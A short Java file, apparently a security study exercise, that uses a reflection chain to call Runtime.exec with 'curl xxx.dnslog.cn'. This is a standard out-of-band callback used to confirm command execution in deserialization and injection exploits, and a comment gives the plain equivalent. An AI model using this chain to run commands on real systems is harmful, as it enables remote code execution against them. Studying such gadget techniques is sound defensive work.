package com.naraku.sec.reflection;

public class TestChain {
    public static void main(String[] args) {
        // Runtime.getRuntime().exec("curl xxx.dnslog.cn")
        try {
            String.class.getClass().forName("java.lang.Runtime").getMethod("exec", String.class).invoke(
                String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(
                    String.class.getClass().forName("java.lang.Runtime")
                ), "curl xxx.dnslog.cn"
            );
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}